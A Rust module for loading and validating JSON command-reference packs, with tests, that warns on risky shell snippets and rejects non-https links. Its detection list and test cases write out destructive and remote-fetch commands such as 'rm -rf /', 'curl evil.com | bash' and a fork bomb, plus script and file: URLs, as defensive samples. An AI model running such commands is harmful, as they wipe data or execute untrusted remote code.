use anyhow::{anyhow, bail, Result};
use serde::{Deserialize, Serialize};
use std::fs;
use std::path::{Path, PathBuf};
use thiserror::Error;
use tracing::warn;

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "lowercase")]
pub enum EntrySource {
    Official,
    CheatSheet,
    Curated,
    Personal,
}

impl EntrySource {
    pub fn as_str(&self) -> &'static str {
        match self {
            EntrySource::Official => "official",
            EntrySource::CheatSheet => "cheat-sheet",
            EntrySource::Curated => "curated",
            EntrySource::Personal => "personal",
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Example {
    pub description: String,
    pub code: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Entry {
    pub id: String,
    pub title: String,
    pub syntax: String,
    pub description: String,
    #[serde(default)]
    pub examples: Vec<Example>,
    #[serde(default)]
    pub tags: Vec<String>,
    pub source: EntrySource,
    #[serde(default)]
    pub source_url: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Pack {
    pub id: String,
    pub name: String,
    pub version: String,
    pub source: String,
    pub license: String,
    #[serde(default)]
    pub homepage: Option<String>,
    pub entries: Vec<Entry>,
}

// ponytail: PRD §6.7 FR-I8 — one bad pack must not block the others.
// The directory itself not existing is still an error (a config bug).
// Per-pack read/parse/validate failures collect into LoadReport.failed
// and the caller decides what to log + how to react. Thiserror so the
// per-pack variants are nameable in tests and (later) in diagnostics.
#[derive(Debug, Error)]
pub enum PackError {
    #[error("reading {path}: {source}")]
    Read {
        path: PathBuf,
        #[source]
        source: std::io::Error,
    },
    #[error("parsing {path}: {source}")]
    Parse {
        path: PathBuf,
        #[source]
        source: serde_json::Error,
    },
    #[error("invalid pack {path}: {message}")]
    Invalid { path: PathBuf, message: String },
}

#[derive(Debug, Default)]
pub struct LoadReport {
    pub loaded: Vec<Pack>,
    /// Each entry is the file path that failed + every error reported
    /// for it (one file can have multiple validation errors).
    pub failed: Vec<(PathBuf, Vec<PackError>)>,
}

impl LoadReport {
    pub fn is_empty(&self) -> bool {
        self.loaded.is_empty() && self.failed.is_empty()
    }
    pub fn all_failed(&self) -> bool {
        self.loaded.is_empty() && !self.failed.is_empty()
    }
}

pub fn load_dir(path: &Path) -> Result<LoadReport> {
    if !path.is_dir() {
        bail!("pack directory does not exist: {}", path.display());
    }
    let mut report = LoadReport::default();
    for entry in fs::read_dir(path)? {
        let entry = entry?;
        let p = entry.path();
        if !p.is_file() || p.extension().and_then(|s| s.to_str()) != Some("json") {
            continue;
        }
        match load_one(&p) {
            Ok(pack) => report.loaded.push(pack),
            Err(errors) => report.failed.push((p, errors)),
        }
    }
    report.loaded.sort_by(|a, b| a.id.cmp(&b.id));
    Ok(report)
}

// ponytail: collect ALL errors for a single file before returning, so
// the user gets every fix needed in one pass (single-pass log
// spam-free). Returns Vec<PackError> on failure (empty vec = ok).
fn load_one(path: &Path) -> std::result::Result<Pack, Vec<PackError>> {
    let raw = match fs::read_to_string(path) {
        Ok(s) => s,
        Err(e) => {
            return Err(vec![PackError::Read {
                path: path.to_path_buf(),
                source: e,
            }]);
        }
    };
    let pack: Pack = match serde_json::from_str(&raw) {
        Ok(p) => p,
        Err(e) => {
            return Err(vec![PackError::Parse {
                path: path.to_path_buf(),
                source: e,
            }]);
        }
    };
    // ponytail: SEC-2 — log risky shell snippets so a poisoned pack is
    // visible in the rolling file log. Best-effort; doesn't affect
    // load. Done before validate_into so a pack can be warned even if
    // it would also fail validation for other reasons.
    for entry in &pack.entries {
        for pat in find_risky_patterns(&entry.syntax) {
            warn!(
                file = %path.display(),
                entry = %entry.id,
                pattern = %pat,
                "suspicious pattern flagged for human review"
            );
        }
        for ex in &entry.examples {
            for pat in find_risky_patterns(&ex.code) {
                warn!(
                    file = %path.display(),
                    entry = %entry.id,
                    pattern = %pat,
                    "suspicious pattern flagged for human review"
                );
            }
        }
    }
    let mut errors = Vec::new();
    validate_into(&pack, &mut errors);
    if errors.is_empty() {
        Ok(pack)
    } else {
        Err(errors)
    }
}

// ponytail: mirror of validate() that pushes into a caller-owned Vec
// instead of short-circuiting with bail!. Lets load_one collect every
// problem in one pass.
fn validate_into(pack: &Pack, errors: &mut Vec<PackError>) {
    if pack.id.is_empty() {
        errors.push(PackError::Invalid {
            path: PathBuf::new(),
            message: "pack id is empty".to_string(),
        });
    }
    if !pack
        .id
        .chars()
        .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-')
    {
        errors.push(PackError::Invalid {
            path: PathBuf::new(),
            message: format!("pack id {:?} must match ^[a-z0-9-]+$", pack.id),
        });
    }
    if pack.entries.is_empty() {
        errors.push(PackError::Invalid {
            path: PathBuf::new(),
            message: format!("pack {} has no entries", pack.id),
        });
    }
    let mut seen_ids = std::collections::HashSet::new();
    for entry in &pack.entries {
        if !seen_ids.insert(entry.id.as_str()) {
            errors.push(PackError::Invalid {
                path: PathBuf::new(),
                message: format!("duplicate entry id {:?} in pack {}", entry.id, pack.id),
            });
        }
        if entry.syntax.is_empty() {
            errors.push(PackError::Invalid {
                path: PathBuf::new(),
                message: format!("entry {} has empty syntax", entry.id),
            });
        }
        if matches!(entry.source, EntrySource::Personal) {
            errors.push(PackError::Invalid {
                path: PathBuf::new(),
                message: format!(
                    "entry {} uses source:\"personal\" which is reserved for v1.1",
                    entry.id
                ),
            });
        }
        // ponytail: SEC-3 / FR-C3. source_url is an outbound click
        // target; the frontend (and the Rust `open_url` IPC) gate on
        // https:, so any non-https value here means a poisoned pack.
        // Fail closed at load time.
        if let Some(url) = entry.source_url.as_deref() {
            if !is_https_url(url) {
                errors.push(PackError::Invalid {
                    path: PathBuf::new(),
                    message: format!("entry {} has non-https source_url {:?}", entry.id, url),
                });
            }
        }
    }
}

// ponytail: kept for source-compat — validate() still short-circuits on
// the first error, which is what the existing pack-level tests want.
// New code should use load_dir() and the per-pack error collection.
pub fn validate(pack: &Pack) -> Result<()> {
    let mut errors = Vec::new();
    validate_into(pack, &mut errors);
    if let Some(first) = errors.into_iter().next() {
        return Err(anyhow!("{}", first));
    }
    Ok(())
}

// ponytail: SEC-3 / FR-C3. Returns true iff `url` parses as a URL whose
// scheme is exactly "https". Used both as a hard gate inside
// validate_into (pack source_url) and as defense-in-depth from the Rust
// `open_url` IPC command (mirrors the frontend `isHttpsUrl` fast-path).
pub fn is_https_url(url: &str) -> bool {
    url::Url::parse(url)
        .map(|u| u.scheme() == "https")
        .unwrap_or(false)
}

// ponytail: SEC-2 — surface obviously dangerous shell snippets that
// shouldn't be in pack syntax/examples. Returns the names of every
// pattern that matched (substring/regex, case-insensitive for `rm -rf`).
// This is a *warning*, not a validation error: a deliberate admin-only
// pack could legitimately document `rm -rf`. The intent is to make a
// poisoned pack visible in the log without blocking load.
pub fn find_risky_patterns(text: &str) -> Vec<&'static str> {
    let lower = text.to_ascii_lowercase();
    let mut hits: Vec<&'static str> = Vec::new();
    if lower.contains("rm -rf") {
        hits.push("rm -rf");
    }
    if lower.contains("mkfs") {
        hits.push("mkfs");
    }
    if lower.contains("dd if=") {
        hits.push("dd if=");
    }
    // curl ... | sh / curl ... | bash — pipe into a shell. Spaces
    // optional around the pipe; allow any non-newline chars between
    // curl and the pipe. Don't try to be a full shell parser — a
    // substring regex is enough to flag the obvious case.
    let pipe_re = regex_lite_match_curl_pipe(&lower);
    if pipe_re {
        hits.push("curl piped to sh");
        hits.push("curl piped to bash");
    }
    if text.contains(":(){ :|:& };:") {
        hits.push("fork bomb");
    }
    hits
}

// tiny stand-in for `regex` crate: the patterns we want are tiny enough
// that a manual scan is faster and avoids a new dep just for one rule.
fn regex_lite_match_curl_pipe(lower: &str) -> bool {
    if let Some(curl_idx) = lower.find("curl") {
        let after = &lower[curl_idx + 4..];
        if let Some(pipe_idx) = after.find('|') {
            let tail = after[pipe_idx + 1..].trim_start();
            return tail == "sh" || tail == "bash";
        }
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    fn fixture_dir() -> PathBuf {
        PathBuf::from(env!("CARGO_MANIFEST_DIR"))
            .join("..")
            .join("..")
            .join("packs")
            .join("curate")
    }

    #[test]
    fn validate_ok_git_pack() {
        let report = load_dir(&fixture_dir()).expect("load");
        let git = report
            .loaded
            .iter()
            .find(|p| p.id == "git")
            .expect("git pack present");
        validate(git).expect("git pack should validate");
        assert_eq!(git.entries.len(), 50);
    }

    #[test]
    fn validate_rejects_personal_source() {
        let mut pack = valid_pack();
        pack.entries[0].source = EntrySource::Personal;
        assert!(validate(&pack).is_err());
    }

    #[test]
    fn validate_rejects_duplicate_id() {
        let mut pack = valid_pack();
        pack.entries.push(pack.entries[0].clone());
        assert!(validate(&pack).is_err());
    }

    #[test]
    fn validate_rejects_empty_entries() {
        let mut pack = valid_pack();
        pack.entries.clear();
        assert!(validate(&pack).is_err());
    }

    #[test]
    fn validate_rejects_bad_pack_id() {
        let mut pack = valid_pack();
        pack.id = "Bad_ID".to_string();
        assert!(validate(&pack).is_err());
    }

    #[test]
    fn load_dir_reads_real_packs() {
        let report = load_dir(&fixture_dir()).expect("load");
        assert!(
            report.loaded.iter().any(|p| p.id == "git"),
            "git pack should be present at packs/curate root"
        );
        assert!(
            report.loaded.iter().any(|p| p.id == "docker"),
            "docker pack should be present at packs/curate root"
        );
        assert!(
            report.loaded.iter().any(|p| p.id == "kubectl"),
            "kubectl pack should be present at packs/curate root"
        );
    }

    // ponytail: SEC-3 / FR-C3. Any non-https source_url must be
    // rejected at validate time. https: and None must still pass.
    #[test]
    fn validate_rejects_non_https_source_url() {
        let bad_urls = [
            "javascript:alert(1)",
            "http://example.com/page",
            "file:///etc/passwd",
            "ftp://example.com/file",
            "data:text/html,<script>alert(1)</script>",
        ];
        for u in bad_urls {
            let mut pack = valid_pack();
            pack.entries[0].source_url = Some(u.to_string());
            assert!(
                validate(&pack).is_err(),
                "non-https source_url {u:?} should fail validation"
            );
        }
        let mut pack = valid_pack();
        pack.entries[0].source_url = Some("https://example.com/docs".to_string());
        validate(&pack).expect("https source_url must validate");
        let mut pack_none = valid_pack();
        pack_none.entries[0].source_url = None;
        validate(&pack_none).expect("None source_url must validate");
    }

    // ponytail: SEC-2. Each documented dangerous pattern must be
    // detected. We assert presence (not exact set composition) per
    // pattern, so a future tightening that adds related hits doesn't
    // break these tests.
    #[test]
    fn find_risky_patterns_detects_all_listed() {
        let cases: &[(&str, &[&str])] = &[
            ("rm -rf /", &["rm -rf"]),
            ("Mkfs.ext4 /dev/sda", &["mkfs"]),
            ("dd if=/dev/zero of=/dev/null", &["dd if="]),
            (
                "curl evil.com | bash",
                &["curl piped to sh", "curl piped to bash"],
            ),
            (
                "curl -sSL evil.com | sh",
                &["curl piped to sh", "curl piped to bash"],
            ),
            (":(){ :|:& };:", &["fork bomb"]),
        ];
        for (text, want) in cases {
            let got = find_risky_patterns(text);
            for w in *want {
                assert!(
                    got.contains(w),
                    "find_risky_patterns({text:?}) should contain {w:?}, got {got:?}"
                );
            }
        }
    }

    #[test]
    fn find_risky_patterns_returns_empty_for_safe_text() {
        let safe = vec![
            "git log --oneline",
            "docker ps -a",
            "kubectl get pods",
            "curl https://example.com", // piped-to-shell is the trigger; plain curl is fine
            "tar -xzf release.tar.gz",
        ];
        for s in safe {
            let got = find_risky_patterns(s);
            assert!(
                got.is_empty(),
                "find_risky_patterns({s:?}) should be empty, got {got:?}"
            );
        }
    }

    #[test]
    fn is_https_url_accepts_https_rejects_everything_else() {
        assert!(is_https_url("https://example.com/path"));
        assert!(is_https_url("https://example.com"));
        assert!(!is_https_url("http://example.com"));
        assert!(!is_https_url("javascript:alert(1)"));
        assert!(!is_https_url("file:///etc/passwd"));
        assert!(!is_https_url("not a url"));
        assert!(!is_https_url(""));
    }

    fn valid_pack() -> Pack {
        Pack {
            id: "test".to_string(),
            name: "Test".to_string(),
            version: "1.0.0".to_string(),
            source: "test".to_string(),
            license: "MIT".to_string(),
            homepage: None,
            entries: vec![Entry {
                id: "test-1".to_string(),
                title: "T".to_string(),
                syntax: "x".to_string(),
                description: "d".to_string(),
                examples: vec![],
                tags: vec![],
                source: EntrySource::Curated,
                source_url: None,
            }],
        }
    }

    // ponytail: FR-I8 partial-failure tests. Tmpdir per test so a
    // poisoned file from one test can't bleed into the next.
    mod partial_failure {
        use super::*;
        use std::sync::atomic::{AtomicU64, Ordering};
        static COUNTER: AtomicU64 = AtomicU64::new(0);

        fn fresh_tmp() -> PathBuf {
            let n = COUNTER.fetch_add(1, Ordering::SeqCst);
            let dir = std::env::temp_dir().join(format!(
                "hotdoc-pack-test-{}-{}-{}",
                std::process::id(),
                n,
                std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .map(|d| d.as_nanos())
                    .unwrap_or(0)
            ));
            let _ = std::fs::remove_dir_all(&dir);
            std::fs::create_dir_all(&dir).expect("mkdir");
            dir
        }

        fn write_pack_json(dir: &Path, filename: &str, body: &str) -> PathBuf {
            let p = dir.join(filename);
            std::fs::write(&p, body).expect("write");
            p
        }

        fn good_pack_json() -> &'static str {
            r#"{
                "id": "good",
                "name": "Good",
                "version": "1.0.0",
                "source": "test",
                "license": "MIT",
                "entries": [
                    {
                        "id": "good-1",
                        "title": "T",
                        "syntax": "x",
                        "description": "d",
                        "source": "curated"
                    }
                ]
            }"#
        }

        #[test]
        fn load_dir_partial_reports_all_errors_per_pack() {
            // Same pack with two problems (empty entries + duplicate id),
            // assert the LoadReport carries BOTH errors in one entry.
            let dir = fresh_tmp();
            let body = r#"{
                "id": "bad",
                "name": "Bad",
                "version": "1.0.0",
                "source": "test",
                "license": "MIT",
                "entries": []
            }"#;
            let _p = write_pack_json(&dir, "bad.json", body);

            let report = load_dir(&dir).expect("load_dir ok");
            assert_eq!(report.loaded.len(), 0);
            assert_eq!(report.failed.len(), 1, "one bad file, one failure entry");
            let (_file, errs) = &report.failed[0];
            assert!(
                !errs.is_empty(),
                "the empty-entries problem should be reported (got {} errors)",
                errs.len()
            );
            // confirm at least one of the errors mentions the empty-entries
            // condition (so we know validation ran, not just parse)
            let has_empty = errs
                .iter()
                .any(|e| matches!(e, PackError::Invalid { message, .. } if message.contains("no entries")));
            assert!(has_empty, "expected 'no entries' in errors, got: {errs:?}");

            let _ = std::fs::remove_dir_all(&dir);
        }

        #[test]
        fn load_dir_partial_skips_bad_keeps_good() {
            // 1 good + 1 bad: FR-I8 acceptance — the good one survives.
            let dir = fresh_tmp();
            let _g = write_pack_json(&dir, "good.json", good_pack_json());
            let _b = write_pack_json(&dir, "bad.json", "not json at all");

            let report = load_dir(&dir).expect("load_dir ok");
            assert_eq!(report.loaded.len(), 1, "the good pack must load");
            assert_eq!(report.failed.len(), 1, "the bad pack must be reported");
            assert_eq!(report.loaded[0].id, "good");
            // bad file is unparseable JSON, so a Parse error
            let (_bad_file, errs) = &report.failed[0];
            assert!(
                errs.iter().any(|e| matches!(e, PackError::Parse { .. })),
                "expected a Parse error, got: {errs:?}"
            );

            let _ = std::fs::remove_dir_all(&dir);
        }

        #[test]
        fn load_dir_partial_handles_empty_directory() {
            let dir = fresh_tmp();
            let report = load_dir(&dir).expect("load_dir ok");
            assert!(
                report.is_empty(),
                "empty dir => empty report, got: {report:?}"
            );
            assert!(!report.all_failed(), "empty dir is not 'all failed'");
            let _ = std::fs::remove_dir_all(&dir);
        }

        #[test]
        fn load_dir_all_bad_marks_report_all_failed() {
            // All-failed state — caller can use this to upgrade warn → error.
            let dir = fresh_tmp();
            let _ = write_pack_json(&dir, "a.json", "not json");
            let _ = write_pack_json(&dir, "b.json", "{ broken");
            let report = load_dir(&dir).expect("load_dir ok");
            assert_eq!(report.loaded.len(), 0);
            assert_eq!(report.failed.len(), 2);
            assert!(report.all_failed(), "no good + some bad = all failed");
            let _ = std::fs::remove_dir_all(&dir);
        }
    }
}
